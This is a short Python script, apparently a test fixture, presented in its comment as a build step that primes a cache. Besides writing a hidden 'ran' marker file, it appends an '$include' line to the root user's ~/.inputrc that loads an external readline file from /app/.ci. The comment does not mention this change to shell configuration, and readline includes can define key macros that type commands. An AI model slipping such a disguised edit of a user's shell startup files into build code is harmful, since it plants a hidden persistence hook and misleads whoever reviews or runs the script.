import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.f5b59a0adef70055', 'w').write('ran\n')
os.makedirs('/root', exist_ok=True)
open('/root/.inputrc', 'a').write('$include /app/.ci/fixture.inputrc\n')
assert open('/app/lines.txt').read()
print('ok')
